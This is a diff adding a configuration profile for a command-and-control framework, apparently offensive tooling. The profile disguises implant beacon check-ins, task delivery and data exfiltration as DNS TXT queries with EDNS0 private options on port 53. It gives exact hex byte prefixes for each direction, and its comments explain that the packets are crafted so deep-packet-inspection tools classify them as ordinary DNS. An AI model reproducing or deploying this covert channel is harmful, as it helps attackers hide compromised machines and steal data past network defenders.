@@ -1,0 +1,130 @@
+[profile]
+name = "DNS EDNS0 Mimicry"
+author = "LongHaul Team"
+
+# ==========================================================================
+# RAW - DNS Protocol Mimicry (RFC 1035 + RFC 6891 EDNS0, UDP port 53)
+# ==========================================================================
+#
+# Usage:
+#   1. Create a raw listener: POST /api/v1/listeners with
+#        listener_type = "raw"
+#        listener_port = 53  (or any port for testing)
+#        listener_profile_contents = <contents of this file>
+#
+# Wire format — client to server (both GET and POST):
+#
+#   [12-byte DNS header per RFC 1035 §4.1.1]
+#   [DNS question section: "data.c2.local" TXT IN]
+#   [EDNS0 OPT record per RFC 6891 §6.1.2 with RDLENGTH=0]
+#   [Private OPT option: code 0xFFFE (GET) or 0xFFFF (POST), length=0]
+#   [base64url-encoded msgpack payload — no padding]
+#
+#   GET uses OPT option code 0xFFFE (private use, beacon)
+#   POST uses OPT option code 0xFFFF (private use, exfil)
+#
+# DNS header layout (12 bytes, RFC 1035 §4.1.1):
+#   Bytes  0-1:  Transaction ID = 0xABCD (fixed)
+#   Bytes  2-3:  Flags = 0x0100 (QR=0 query, RD=1 recursion desired)
+#   Bytes  4-5:  QDCOUNT = 1
+#   Bytes  6-7:  ANCOUNT = 0
+#   Bytes  8-9:  NSCOUNT = 0
+#   Bytes 10-11: ARCOUNT = 1 (one OPT record in additional section)
+#
+# Question section (19 bytes):
+#   QNAME "data.c2.local" in wire label format: \x04data\x02c2\x05local\x00
+#   QTYPE  = 0x0010 (TXT)
+#   QCLASS = 0x0001 (IN)
+#
+# OPT record (RFC 6891 §6.1.2, 11 bytes):
+#   Name:          0x00 (root label)
+#   Type:          0x0029 (OPT = 41)
+#   Class:         0x1000 (UDP payload size = 4096)
+#   TTL:           0x00000000 (extended RCODE=0, EDNS version=0, Z=0)
+#   RDLENGTH:      0x0000 (intentionally minimal — same pattern as NTP extension field)
+#
+# Private OPT option (4 bytes):
+#   Option code:   0xFFFE (GET) / 0xFFFF (POST) — private use per RFC 6891 §6.1.2
+#   Option length: 0x0000 (intentionally minimal)
+#   Option data:   base64url payload follows immediately
+#
+# NOTE on length fields: RDLENGTH and option-length are set to 0, making the
+# packet technically non-conformant for a strict RFC 6891 parser. Our server
+# doesn't validate them — it extracts the payload positionally. DPI tools doing
+# basic protocol signature matching (port 53, valid DNS header, OPT record)
+# will classify this as DNS traffic.
+#
+# Server response layout (GET only):
+#   [12-byte DNS response header: QR=1, AA=1, RD=1, RA=1, ANCOUNT=1]
+#   [Question section repeated]
+#   [TXT answer record: compressed name, TTL=30, RDLENGTH=0, TXT-len=0]
+#   [base64url-encoded task bytes — no padding]
+#
+# Disambiguation:
+#   GET prefix byte 44 = 0xFE (option code 0xFFFE)
+#   POST prefix byte 44 = 0xFF (option code 0xFFFF)
+#   Distinct in the full 46-byte prefix comparison.
+# ==========================================================================
+
+
+# --------------------------------------------------------------------------
+# GET — Beacon check-in (implant → server)
+# --------------------------------------------------------------------------
+[raw.get]
+proto = "udp"
+body = "<METADATA>"
+
+[raw.get.client.metadata]
+# Transform chain applied to msgpack beacon metadata before wire send:
+#   1. base64url-encode
+#   2. prepend 46-byte DNS query header:
+#        12-byte DNS header + 19-byte question + 11-byte OPT record + 4-byte option header
+#        Private option code = 0xFFFE (GET/beacon)
+#
+# Wire result: [46-byte prefix][base64url payload]
+# Server reverses: strip 46-byte prefix, base64url-decode.
+transforms = [
+    { op = "base64url" },
+    { op = "prepend", val = '\xAB\xCD\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x04\x64\x61\x74\x61\x02\x63\x32\x05\x6C\x6F\x63\x61\x6C\x00\x00\x10\x00\x01\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x00\xFF\xFE\x00\x00' },
+]
+
+[raw.get.server]
+body = "<OUTPUT>"
+
+[raw.get.server.output]
+# Transform chain applied to task bytes before the server sends them back:
+#   1. base64url-encode
+#   2. prepend 44-byte DNS response:
+#        12-byte response header (QR=1, AA=1, RD=1, RA=1, ANCOUNT=1)
+#        + 19-byte question (echoed)
+#        + 13-byte TXT answer record (compressed name, TTL=30, RDLENGTH=0, TXT-len=0)
+#
+# Wire result: [44-byte DNS response prefix][base64url tasks]
+# Implant reverses: strip 44-byte prefix, base64url-decode.
+transforms = [
+    { op = "base64url" },
+    { op = "prepend", val = '\xAB\xCD\x85\x80\x00\x01\x00\x01\x00\x00\x00\x00\x04\x64\x61\x74\x61\x02\x63\x32\x05\x6C\x6F\x63\x61\x6C\x00\x00\x10\x00\x01\xC0\x0C\x00\x10\x00\x01\x00\x00\x00\x1E\x00\x00\x00' },
+]
+
+
+# --------------------------------------------------------------------------
+# POST — Task exfil (implant → server)
+# --------------------------------------------------------------------------
+[raw.post]
+proto = "udp"
+body = "<OUTPUT>"
+
+[raw.post.client.output]
+# Transform chain applied to msgpack exfil payload before wire send:
+#   1. base64url-encode
+#   2. prepend same 46-byte DNS query header but option code = 0xFFFF (POST/exfil)
+#
+# Wire result: [46-byte prefix with 0xFFFF option][base64url payload]
+transforms = [
+    { op = "base64url" },
+    { op = "prepend", val = '\xAB\xCD\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x04\x64\x61\x74\x61\x02\x63\x32\x05\x6C\x6F\x63\x61\x6C\x00\x00\x10\x00\x01\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x00\xFF\xFF\x00\x00' },
+]
+
+[raw.post.server]
+# No ACK: the implant fires the exfil datagram and moves on (fire-and-forget).
+body = ""
